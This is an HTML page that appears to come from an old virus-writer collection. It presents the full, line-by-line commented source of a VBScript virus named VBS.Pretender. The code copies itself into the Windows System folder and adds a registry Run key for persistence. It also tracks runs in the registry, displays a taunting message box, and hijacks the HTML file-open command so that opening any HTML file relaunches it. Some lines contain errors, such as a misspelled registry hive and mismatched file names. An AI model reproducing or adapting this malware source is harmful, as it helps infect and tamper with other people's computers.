<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<Title>VBS.Pretender</Title>
</HEAD>
<BODY bgcolor = white text = black link = darkgray vlink = lightgray alink = red>
<h3>VBS.Pretender (commented) - <i>Lucky2000`</i></h3>
<font size = "2" face = courier>
' VBS.Pretender<br>
' Coded by Lucky2000`<br>
'<br>
' Begin code<br>
On Error Resume Next  ' -[ If there is an error, continue<br>
Set fso = CreateObject("Scripting.FileSystemObject")  ' -[ Define fso to allow creation and editing of files<br>
Set reg = CreateObject("WScript.Shell")  ' -[ Define reg to allow Registry editing<br>
Const SystemFolder = 1, ForReading = 1, ForWriting = 2, ForAppending = 8  ' -[ Make numbers more meaningful<br>
<br>
Dim Parent, ReadIt, Destination, Mirror, FileInfo, Check, Loaded  ' -[ Set variables used<br>
Parent = WScript.ScriptFullName  ' -[ Get the full path and filename of the script<br>
Set Destination = fso.GetSpecialFolder(SystemFolder)  ' -[ Make Destination = %WINDOWS%\System<br>
FileInfo = Destination & "\VBS.Pretender.vbs"  ' -[ Append the file name to Destination (%WINDOWS%\System\VBS.Pretender.vbs)<br>
If (fso.FileExists(FileInfo)) Then  ' -[ Check to see if the file already exists.  If it does<br>
Set Check = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Pretender")  ' -[ Check to see if the code is run at startup by reading from the Registry<br>
If Check = FileInfo Then  ' -[ If code is present in the run list then end the IF loop<br>
Else<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Pretender", FileInfo  ' -[ Else, edit the registry to make the code run at startup<br>
End If  ' -[ End the IF loop<br>
<br>
Else<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Runs", "1"  ' -[ If the file does not exist then create a Registry entry to show amount of runs<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Notifies", "0"  ' -[ Create a Registry entry to show the amount of times the code has notified the user<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Pretender", FileInfo  ' -[ Create a Registry entry to make sure the code is run at startup<br>
Set ReadMe = fso.OpenTextFile(Parent, ForReading)  ' -[ Open the code for reading<br>
ReadIt = ReadMe.ReadAll  ' -[ Read all the code<br>
ReadMe.Close  ' -[ Close the code file<br>
Set Mirror = fso.CreateTextFile(FileInfo, True)  ' -[ Create a textfile in %WINDOWS%\System called VBS.Pretender.vbs<br>
Mirror.Write ReadIt  ' -[ Write the previously read code to it<br>
Mirror.Close  ' -[ Close the file<br>
End If<br>
<br>
Mins = Minute(Now)  ' -[ Get the minute count from the current time<br><br>

If Mins = "11" Then  ' -[ If the returned value is "11" then<br>
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Runs")  ' -[ Read the amount of runs from the Registry<br>
Notifies = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Notifies")  ' -[ Read the amount of notifies from the Registry<br>
MsgBox "Pretender´s time are Ticked.. " & (Chr(13) & Chr(10)) & "Pretender 2000 by Lucky2000 Group " & Loaded & " Restarts Before Making Myself Known To You. I Have Notified You " & Notifies & "Time(s) Before" & (Chr(13) & Chr(10)) & (Chr(13) & Chr(10)) & "VBS.Pretender"  & (Chr(13) & Chr(10)) & "Coded by Lucky2000" & (Chr(13) & Chr(10)) & "Make me happy" & (Chr(13) & Chr(10)) & "LUCKY2000", 4096, "VBS.Pretender"  ' -[ Display a message box on the screen that stays on top of all applications that shows the amount of runs, notifies and the coder, group and URL<br>
Reg.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\(Default)", "c:\windows\system\Pretender.vbs"  ' -[ Edit a Registry entry so that when an HTML file is clicked, the code is run again<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Runs", "0"  ' -[ Reset the amount of runs to 0
Notifies = Notifies + 1  ' -[ Increase the amount of notifies by 1<br>
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Notifies", "Notifies"  ' -[ Re-write the amount of notifies to the Registry<br>
Else<br>
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Pretender\Runs")  ' -[ If the minutes returned does not equal 11<br>
Loaded = Loaded + 1  ' -[ Increase the amount of runs by 1<br>
Reg.RegWrite "HKEY_LOCAL_MACHICE\Software\Microsoft\Windows\CurrentVersion\Pretender\Runs", Loaded  ' -[ Re-write the amount of runs to the Registry<br>
End If<br>
' End Code<br>
</font>
</BODY>
</HTML>